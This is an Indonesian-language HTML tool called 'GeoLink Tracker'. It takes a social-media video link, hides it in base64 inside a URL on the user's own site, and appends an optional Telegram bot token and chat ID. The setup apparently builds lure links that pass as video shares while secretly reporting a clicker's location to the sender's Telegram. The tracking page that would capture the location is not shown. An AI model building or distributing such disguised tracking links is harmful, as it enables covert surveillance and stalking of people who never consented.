<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GeoLink Tracker</title>
<style>
  body {
    font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
    background: #0f172a; color: #e5e7eb;
    padding: 20px; min-height: 100vh;
  }
  .container { max-width: 700px; margin: 0 auto; }
  h1 { color: #4ade80; margin-bottom: 20px; }
  .panel {
    background: #1e293b; padding: 24px;
    border-radius: 16px; margin-bottom: 20px;
  }
  label {
    display: block; font-size: 13px;
    font-weight: 600; margin-bottom: 6px;
    margin-top: 14px; color: #94a3b8;
  }
  label:first-of-type { margin-top: 0; }
  input {
    width: 100%; padding: 12px 14px;
    background: #0f172a; border: 1px solid #334155;
    border-radius: 8px; color: white;
    font-size: 14px; outline: none;
    font-family: inherit;
  }
  input:focus { border-color: #60a5fa; }
  input::placeholder { color: #64748b; }
  button {
    width: 100%; padding: 14px;
    background: linear-gradient(135deg, #833ab4, #fd1d1d);
    color: white; border: none;
    border-radius: 10px; font-size: 15px;
    font-weight: 700; cursor: pointer;
    margin-top: 18px;
  }
  button:hover { opacity: 0.9; }
  #resultBox {
    display: none; margin-top: 16px;
    background: #0f172a; padding: 14px;
    border-radius: 10px;
    border: 1px solid #334155;
  }
  #resultBox.show { display: block; }
  #output {
    font-family: monospace; font-size: 12px;
    word-break: break-all; color: #93c5fd;
    background: #020617; padding: 12px;
    border-radius: 6px; margin-bottom: 10px;
    user-select: all;
  }
  .btn-row { display: flex; gap: 8px; }
  .btn-row button {
    flex: 1; margin-top: 0;
    padding: 10px; font-size: 13px;
  }
  .btn-copy { background: #0ea5e9; }
  .btn-test { background: #6366f1; }
  .info {
    background: #1e3a5f; color: #bfdbfe;
    padding: 12px; border-radius: 8px;
    font-size: 12px; margin-bottom: 16px;
    line-height: 1.6;
  }
</style>
</head>
<body>

<div class="container">
  <h1>📍 GeoLink Tracker</h1>

  <div class="info">
    <b>Test dulu:</b> Isi semua field, klik Generate. Kalau link muncul di bawah = OK ✅
  </div>

  <div class="panel">
    <label>Link Video (IG / TikTok / YouTube / dll)</label>
    <input type="text" id="videoUrl" placeholder="https://www.instagram.com/reel/xxxxx/" value="https://www.instagram.com/reel/C8QZqXvSNrK/">

    <label>URL Website Anda</label>
    <input type="text" id="baseUrl" placeholder="https://xxx.netlify.app" value="https://example.com">

    <label>Bot Token Telegram (opsional)</label>
    <input type="text" id="botToken" placeholder="1234567:ABC-DEF...">

    <label>Chat ID Telegram (opsional)</label>
    <input type="text" id="chatId" placeholder="123456789">

    <button id="btnGenerate" onclick="generateLink()">🔗 Generate Link</button>

    <div id="resultBox">
      <div id="output"></div>
      <div class="btn-row">
        <button class="btn-copy" onclick="copyLink()">📋 Copy</button>
        <button class="btn-test" onclick="testLink()">🧪 Test</button>
      </div>
    </div>
  </div>
</div>

<script>
// Simpan URL di variabel global
var generatedUrl = '';

function generateLink() {
  // Ambil nilai dari input
  var videoUrl = document.getElementById('videoUrl').value.trim();
  var baseUrl = document.getElementById('baseUrl').value.trim();
  var botToken = document.getElementById('botToken').value.trim();
  var chatId = document.getElementById('chatId').value.trim();

  // Validasi
  if (!videoUrl) {
    alert('Isi link video dulu!');
    return;
  }
  if (videoUrl.indexOf('http') !== 0) {
    alert('Link harus mulai dengan http:// atau https://');
    return;
  }
  if (!baseUrl) {
    alert('Isi URL website dulu!');
    return;
  }

  // Buang trailing slash
  baseUrl = baseUrl.replace(/\/+$/, '');

  // Encode video URL ke base64 URL-safe
  var encodedVideo = btoa(unescape(encodeURIComponent(videoUrl)))
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');

  // Random token
  var token = Math.random().toString(36).slice(2, 12);

  // Bangun URL
  var url = baseUrl + '/?r=' + encodedVideo + '&t=' + token;
  if (botToken) url += '&b=' + encodeURIComponent(botToken);
  if (chatId) url += '&c=' + encodeURIComponent(chatId);

  // Simpan & tampilkan
  generatedUrl = url;

  var outputEl = document.getElementById('output');
  var resultBox = document.getElementById('resultBox');
  outputEl.textContent = url;
  resultBox.classList.add('show');

  console.log('Generated URL:', url);
}

function copyLink() {
  if (!generatedUrl) {
    alert('Generate dulu!');
    return;
  }
  navigator.clipboard.writeText(generatedUrl).then(function() {
    alert('✅ Link berhasil di-copy!');
  }).catch(function() {
    var ta = document.createElement('textarea');
    ta.value = generatedUrl;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    alert('✅ Link berhasil di-copy!');
  });
}

function testLink() {
  if (!generatedUrl) {
    alert('Generate dulu!');
    return;
  }
  window.open(generatedUrl, '_blank');
}
</script>

</body>
</html>
